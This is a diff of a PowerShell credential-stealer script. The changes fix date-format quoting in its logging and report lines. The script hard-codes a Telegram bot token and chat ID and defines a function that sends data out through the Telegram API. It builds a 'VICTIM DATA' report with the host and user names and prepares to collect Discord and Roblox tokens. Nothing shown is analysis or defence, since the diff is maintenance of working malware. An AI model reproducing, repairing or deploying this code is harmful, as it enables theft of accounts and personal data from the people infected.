@@ -6,10 +6,10 @@
 $botToken = "8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"
 $chatId = "8445047233"
 $logFile = "$env:TEMP\stealer_debug.log"
-function Write-Log { param([string]$Msg) "$((Get-Date -f yyyy-MM-dd HH:mm:ss)) - $Msg" | Out-File -FilePath $logFile -Append -Encoding UTF8 }
+function Write-Log { param([string]$Msg); "$((Get-Date -f 'yyyy-MM-dd HH:mm:ss')) - $Msg" | Out-File -FilePath $logFile -Append -Encoding UTF8 }
 function Send-Telegram { param([string]$Message); try { Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{chat_id=$chatId;text=$Message;parse_mode="HTML"} -ErrorAction Stop | Out-Null } catch { try { $body="chat_id=$chatId&text=$([Uri]::EscapeDataString($Message))"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("Content-Type","application/x-www-form-urlencoded"); $wc.UploadString("https://api.telegram.org/bot$botToken/sendMessage",$body) | Out-Null } catch {} } }
 
-$report = "<b>[+] VICTIM DATA</b>`nHost: $env:COMPUTERNAME`nUser: $env:USERNAME`nTime: $(Get-Date -f yyyy-MM-dd HH:mm:ss)`n"
+$report = "<b>[+] VICTIM DATA</b>`nHost: $env:COMPUTERNAME`nUser: $env:USERNAME`nTime: $(Get-Date -f 'yyyy-MM-dd HH:mm:ss')`n"
 $discordTokens = @()
 $robloxTokens = @()
 
